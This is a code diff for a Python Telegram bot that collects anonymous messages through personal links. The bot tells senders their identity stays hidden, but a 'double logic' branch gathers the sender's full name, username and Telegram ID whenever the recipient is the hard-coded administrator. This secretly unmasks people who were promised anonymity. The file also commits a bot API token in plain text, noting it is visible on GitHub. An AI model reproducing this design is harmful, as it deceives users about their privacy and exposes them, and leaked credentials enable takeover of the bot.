@@ -1,9 +1,126 @@
-Если получатель - это АДМИНИСТРАТОР (ВЫ)
+import os
+import logging
+import uuid
+import sqlite_utils
+
+from aiogram import Bot, Dispatcher, types, executor
+from aiogram.dispatcher.filters.state import State, StatesGroup
+from aiogram.dispatcher import FSMContext
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
+
+# --- КОНФИГУРАЦИЯ БОТА ---
+# ВНИМАНИЕ: Эти данные видны на GitHub.
+API_TOKEN = '8597302676:AAH6sOqnLONNdboRPwfYhmzk_fkL4sFRDo0' 
+YOUR_TELEGRAM_ID = 7227557185 
+BOT_USERNAME = 'MTGASKBot' 
+# -------------------------
+
+if not API_TOKEN or YOUR_TELEGRAM_ID is None:
+    logging.error("❌ Критическая ошибка: Отсутствует BOT_TOKEN или YOUR_ID.")
+    exit(1)
+
+
+# Настройка логирования
+logging.basicConfig(level=logging.INFO)
+bot = Bot(token=API_TOKEN)
+dp = Dispatcher(bot, storage=MemoryStorage())
+DB_NAME = 'anon_bot.db'
+db = sqlite_utils.Database(DB_NAME)
+
+if 'users' not in db.table_names():
+    db["users"].create(
+        {"id": int, "link_token": str},
+        pk="id",
+        if_not_exists=True
+    )
+
+# --- FSM для отслеживания состояния отправки ---
+class AnonMessage(StatesGroup):
+    recipient_id = State() 
+    waiting_for_message = State()
+
+# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
+
+def get_or_create_user_token(user_id: int) -> str:
+    """Получает токен пользователя из БД или создает новый."""
+    user_data = db["users"].get(user_id)
+    if user_data:
+        return user_data["link_token"]
+    else:
+        new_token = str(uuid.uuid4())[:8] 
+        db["users"].insert({"id": user_id, "link_token": new_token}, alter=True)
+        return new_token
+
+def get_user_id_by_token(token: str) -> int or None:
+    """Находит Telegram ID по уникальному токену."""
+    result = db.query("SELECT id FROM users WHERE link_token = ?", (token,)).fetchone()
+    return result[0] if result else None
+
+# --- ХЕНДЛЕРЫ ---
+
+@dp.message_handler(commands=['start'])
+async def handle_start(message: types.Message, state: FSMContext):
+    """
+    Обрабатывает /start. Если есть токен в аргументах, переводит в режим отправки. 
+    Иначе - выдает персональную ссылку.
+    """
+    await state.finish() 
+    args = message.get_args() 
+    
+    if args:
+        # Сценарий 1: Переход по ссылке (начинаем анонимную отправку)
+        recipient_id = get_user_id_by_token(args)
+        
+        if recipient_id:
+            await state.set_state(AnonMessage.recipient_id.state)
+            await state.update_data(recipient_id=recipient_id)
+            
+            await message.reply(
+                "🤫 **Режим анонимного сообщения**\n\n"
+                "Напишите и отправьте ваше сообщение. Получатель не узнает, кто вы.",
+                parse_mode="Markdown"
+            )
+            await AnonMessage.waiting_for_message.set() 
+        else:
+            await message.reply("⚠️ Ссылка недействительна. Отправьте /start, чтобы получить свою ссылку.")
+
+    else:
+        # Сценарий 2: Обычный /start (выдача личной ссылки)
+        user_id = message.from_user.id
+        token = get_or_create_user_token(user_id)
+        
+        link = f"https://t.me/{BOT_USERNAME}?start={token}"
+        
+        await message.reply(
+            "🌟 **Ваша персональная ссылка для анонимных посланий:**\n\n"
+            f"`{link}`\n\n"
+            "Разместите ее в профиле, чтобы начать сбор сообщений!",
+            parse_mode="Markdown"
+        )
+
+@dp.message_handler(commands=['cancel'], state='*')
+async def handle_cancel(message: types.Message, state: FSMContext):
+    """Отмена текущего процесса отправки."""
+    await state.finish()
+    await message.reply("❌ **Отправка сообщения отменена.**", parse_mode="Markdown")
+
+@dp.message_handler(content_types=types.ContentTypes.TEXT, state=AnonMessage.waiting_for_message)
+async def handle_anon_message(message: types.Message, state: FSMContext):
+    """
+    Обработка текста сообщения с реализацией двойной логики анонимности.
+    """
+    data = await state.get_data()
+    recipient_id = data.get("recipient_id")
+    sender_user = message.from_user 
+    
+    # --- ДВОЙНАЯ ЛОГИКА ---
+    
+    # 1. Если получатель - это АДМИНИСТРАТОР (ВЫ)
     if recipient_id == YOUR_TELEGRAM_ID:
         
         # Собираем все доступные данные об отправителе
         sender_info = (
-            f"👤 Отправитель: {sender_user.full_name} "
+            f"👤 **Отправитель:** {sender_user.full_name} "
             f"(@{sender_user.username or 'нет username'})"
             f" (ID: `{sender_user.id}`)"
         )
@@ -37,7 +154,7 @@
 
 # --- ЗАПУСК БОТА ---
 
-if name == '__main__':
+if __name__ == '__main__':
     logging.info("Starting bot...")
     get_or_create_user_token(YOUR_TELEGRAM_ID) 
     
